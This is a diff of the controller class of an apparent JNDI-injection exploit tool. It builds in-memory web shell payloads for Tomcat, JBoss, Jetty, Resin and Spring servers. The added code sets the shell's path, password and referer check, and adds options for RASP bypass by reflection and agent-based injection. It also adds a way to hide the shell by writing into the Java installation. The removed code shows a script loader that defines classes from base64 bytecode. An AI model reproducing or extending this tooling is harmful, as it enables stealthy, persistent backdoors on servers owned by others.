@@ -17,8 +17,8 @@ import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
 import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.resin.RFMSFromThreadF;
 import com.nu1r.jndi.template.resin.RSMSFromThreadS;
+import com.nu1r.jndi.template.spring.SpringControllerMS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
-import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
 import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.utils.Util;
@@ -29,6 +29,10 @@ import com.unboundid.ldap.sdk.ResultCode;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.commons.cli.CommandLine;
+import org.apache.commons.cli.CommandLineParser;
+import org.apache.commons.cli.DefaultParser;
+import org.apache.commons.cli.Options;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.naming.ResourceRef;
 
@@ -37,9 +41,9 @@ import javax.naming.StringRefAddr;
 import java.io.IOException;
 
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
-import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertLinAgent;
-import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertWinAgent;
+import static com.nu1r.jndi.gadgets.utils.HexUtils.generatePassword;
 import static com.nu1r.jndi.gadgets.Config.Config.*;
+import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 
@@ -48,6 +52,8 @@ public class TomcatBypassController implements LdapController {
     private PayloadType payloadType;
     private String[]    params;
     private GadgetType  gadgetType;
+
+    public static CommandLine cmdLine;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -107,6 +113,9 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case springinterceptor:
                     code = helper.injectSpringInterceptor();
+                    break;
+                case springcontroller:
+                    code = helper.injectSpringControllerMS();
                     break;
                 case wsfilter:
                     code = helper.injectWSFilter();
@@ -174,34 +183,78 @@ public class TomcatBypassController implements LdapController {
             }
 
             if (gadgetType == GadgetType.shell) {
-                String url1    = Util.getCmdFromBase(base);
-                int    result1 = url1.indexOf("-");
-                if (result1 != -1) {
-                    String[] U = url1.split("-");
-                    int      i = U.length;
-                    if (i >= 1) {
-                        URL_PATTERN = U[0];
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA shellUrl >> |@" + U[0]));
+                String   arg     = Util.getCmdFromBase(base);
+                String[] args    = arg.split(" ");
+                Options  options = new Options();
+                options.addOption("t", "Type", false, "选择内存马的类型");
+                options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
+                options.addOption("o", "obscure", false, "使用反射绕过");
+                options.addOption("w", "winAgent", false, "Windows下使用Agent写入");
+                options.addOption("l", "linAgent", false, "Linux下使用Agent写入");
+                options.addOption("u", "url", true, "内存马绑定的路径,default [/version.txt]");
+                options.addOption("pw", "password", true, "内存马的密码,default [p@ssw0rd]");
+                options.addOption("r", "referer", true, "内存马 Referer check,default [https://nu1r.cn/]");
+                options.addOption("h", "hide-mem-shell", false, "通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringControllerMS");
+                options.addOption("ht", "hide-type", true, "隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/");
+
+                CommandLineParser parser = new DefaultParser();
+
+                try {
+                    cmdLine = parser.parse(options, args);
+                } catch (Exception e) {
+                    System.out.println("[*] Parameter input error, please use -h for more information");
+                }
+
+                if (cmdLine.hasOption("Type")) {
+                    Shell_Type = cmdLine.getOptionValue("Type");
+                    //System.out.println("内存shell >>" + Shell_Type);
+                }
+
+                if (cmdLine.hasOption("winAgent")) {
+                    winAgent = true;
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
+                }
+
+                if (cmdLine.hasOption("linAgent")) {
+                    winAgent = true;
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
+                }
+
+                if (cmdLine.hasOption("obscure")) {
+                    IS_OBSCURE = true;
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
+                }
+
+                if (cmdLine.hasOption("url")) {
+                    String url = cmdLine.getOptionValue("url");
+                    if (!url.startsWith("/")) {
+                        url = "/" + url;
                     }
-                    if (i >= 2) {
-                        Shell_Type = U[1];
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA shellType >> |@" + U[1]));
+                    URL_PATTERN = url;
+                    System.out.println("[+] Path：" + URL_PATTERN);
+                }
+
+                if (cmdLine.hasOption("password")) {
+                    PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
+                    System.out.println("[+] Password：" + PASSWORD);
+                }
+
+                if (cmdLine.hasOption("referer")) {
+                    REFERER = cmdLine.getOptionValue("referer");
+                    System.out.println("[+] referer：" + REFERER);
+                }
+
+                if (cmdLine.hasOption("AbstractTranslet")) {
+                    IS_INHERIT_ABSTRACT_TRANSLET = true;
+                    System.out.println("[+] 继承恶意类AbstractTranslet");
+                }
+
+                if (cmdLine.hasOption("hide-mem-shell")) {
+                    HIDE_MEMORY_SHELL = true;
+
+                    if (cmdLine.hasOption("hide-type")) {
+                        HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
                     }
-                    if (url1.contains("obscure")) {
-                        IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
-                    }
-                    if (url1.contains("winAgent")) {
-                        winAgent = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
-                    }
-                    if (url1.contains("linAgent")) {
-                        linAgent = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
-                    }
-                } else {
-                    URL_PATTERN = url1;
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
                 }
             }
 
@@ -255,184 +308,43 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatFilterJmx() throws Exception {
-            //初始化全局配置
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TFJMX.class));
-            CtClass ctClass = pool.get(TFJMX.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TFJMX.class);
         }
 
         public String injectTomcatFilterTh() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
-            CtClass ctClass = pool.get(TFMSFromThreadF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TFMSFromThreadF.class);
         }
 
         public String injectTomcatListenerJmx() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
-            CtClass ctClass = pool.get(TLMSFromJMXLi.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TLMSFromJMXLi.class);
         }
 
         public String injectTomcatListenerTh() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
-            CtClass ctClass = pool.get(TLMSFromThreadLi.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TLMSFromThreadLi.class);
         }
 
         public String injectTomcatServletJmx() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
-            CtClass ctClass = pool.get(TSMSFromJMXS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TSMSFromJMXS.class);
         }
 
         public String injectTomcatServletTh() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
-            CtClass ctClass = pool.get(TSMSFromThreadS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(TSMSFromThreadS.class);
         }
 
         public String injectJBossFilter() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
-            CtClass ctClass = pool.get(JBFMSFromContextF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(JBFMSFromContextF.class);
         }
 
         public String injectJBossServlet() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
-            CtClass ctClass = pool.get(JBSMSFromContextS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(JBSMSFromContextS.class);
         }
 
         public String injectJettyFilter() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
-            CtClass ctClass = pool.get(JFMSFromJMXF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(JFMSFromJMXF.class);
         }
 
         public String injectJettyServlet() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
-            CtClass ctClass = pool.get(JSMSFromJMXS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(JSMSFromJMXS.class);
         }
 
         public String injectWSFilter() throws Exception {
@@ -450,6 +362,29 @@ public class TomcatBypassController implements LdapController {
                 TinsertLinAgent(ctClass);
                 return injectClass(WinMenshell.class);
             }
+            if (HIDE_MEMORY_SHELL) {
+                switch (HIDE_MEMORY_SHELL_TYPE) {
+                    case 1:
+                        break;
+                    case 2:
+                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        newClass.setName(generateClassName());
+                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                        String className = "className=\"" + ctClass.getName() + "\";";
+                        newClass.defrost();
+                        newClass.makeClassInitializer().insertBefore(content);
+                        newClass.makeClassInitializer().insertBefore(className);
+
+                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass = pool.get(abstTranslet.getName());
+                            newClass.setSuperclass(superClass);
+                        }
+
+                        return injectClass(newClass.getClass());
+                }
+            }
+            
             return injectClass(ctClass.getClass());
         }
 
@@ -468,83 +403,53 @@ public class TomcatBypassController implements LdapController {
                 TinsertLinAgent(ctClass);
                 return injectClass(WinMenshell.class);
             }
+            if (HIDE_MEMORY_SHELL) {
+                switch (HIDE_MEMORY_SHELL_TYPE) {
+                    case 1:
+                        break;
+                    case 2:
+                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        newClass.setName(generateClassName());
+                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                        String className = "className=\"" + ctClass.getName() + "\";";
+                        newClass.defrost();
+                        newClass.makeClassInitializer().insertBefore(content);
+                        newClass.makeClassInitializer().insertBefore(className);
+
+                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass = pool.get(abstTranslet.getName());
+                            newClass.setSuperclass(superClass);
+                        }
+
+                        return injectClass(newClass.getClass());
+                }
+            }
+            
             return injectClass(ctClass.getClass());
         }
 
         public String injectSpringInterceptor() throws Exception {
-            Config.init();
-            byte[]    classBytes;
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
-            CtClass ctClass = pool.get(SpringInterceptorMS.class.getName());
-            String  target  = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
-            pool.insertClassPath(new ClassClassPath(SpringMemshellTemplate.class));
-            CtClass springTemplateClass = pool.get(target);
-            // 类名后加时间戳
-            String clazzName = target + System.nanoTime();
-            springTemplateClass.setName(clazzName);
-            String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
-            // 修改b64字节码
-            String b64content = "b64=\"" + encode + "\";";
-            ctClass.makeClassInitializer().insertBefore(b64content);
-            // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
-            String clazzNameContent = "clazzName=\"" + clazzName + "\";";
-            ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-            ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
-            classBytes = ctClass.toBytecode();
-            clazzName = SpringInterceptorMS.class.getName() + System.nanoTime();
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectShell(classBytes, clazzName);
+            return structureShellTom(SpringInterceptorMS.class);
+        }
+
+        public String injectSpringControllerMS() throws Exception {
+            return structureShellTom(SpringControllerMS.class);
         }
 
         public String injectResinFilterTh() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
-            CtClass ctClass = pool.get(RFMSFromThreadF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(RFMSFromThreadF.class);
         }
 
         public String injectResinServletTh() throws Exception {
-            Config.init();
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
-            CtClass ctClass = pool.get(RSMSFromThreadS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-            ctClass.setName(generateClassName());
-            if (winAgent) {
-                TinsertWinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            if (linAgent) {
-                TinsertLinAgent(ctClass);
-                return injectClass(WinMenshell.class);
-            }
-            return injectClass(ctClass.getClass());
+            return structureShellTom(RSMSFromThreadS.class);
         }
 
         public String injectTomcatUpgrade() throws Exception {
             Config.init();
             ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
-            CtClass ctClass = pool.get(TUGMSFromJMXuP.class.getName());
+            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
+            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
             InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
             ctClass.setName(generateClassName());
             if (winAgent) {
@@ -555,57 +460,29 @@ public class TomcatBypassController implements LdapController {
                 TinsertLinAgent(ctClass);
                 return injectClass(WinMenshell.class);
             }
+            if (HIDE_MEMORY_SHELL) {
+                switch (HIDE_MEMORY_SHELL_TYPE) {
+                    case 1:
+                        break;
+                    case 2:
+                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        newClass.setName(generateClassName());
+                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+                        String className = "className=\"" + ctClass.getName() + "\";";
+                        newClass.defrost();
+                        newClass.makeClassInitializer().insertBefore(content);
+                        newClass.makeClassInitializer().insertBefore(className);
+
+                        if (IS_INHERIT_ABSTRACT_TRANSLET) {
+                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass = pool.get(abstTranslet.getName());
+                            newClass.setSuperclass(superClass);
+                        }
+
+                        return injectClass(newClass.getClass());
+                }
+            }
             return injectClass(ctClass.getClass());
         }
-
-        //类加载方式，因类而异
-        public String injectClass(Class clazz) {
-
-            String classCode = null;
-            try {
-                //获取base64后的类
-                classCode = Util.getClassCode(clazz);
-
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-
-            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
-                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
-                    "try{\n" +
-                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
-                    "   clazz.newInstance();\n" +
-                    "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
-                    "   method.setAccessible(true);\n" +
-                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                    "   clazz.newInstance();\n" +
-                    "};";
-        }
-
-        public String injectShell(byte[] classBytes, String clazzName) {
-
-            String classCode = null;
-            try {
-                //获取base64后的类
-                classCode = Util.getClassType(classBytes);
-
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-
-            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
-                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
-                    "try{\n" +
-                    "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
-                    "   clazz.newInstance();\n" +
-                    "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
-                    "   method.setAccessible(true);\n" +
-                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                    "   clazz.newInstance();\n" +
-                    "};";
-        }
-
     }
 }
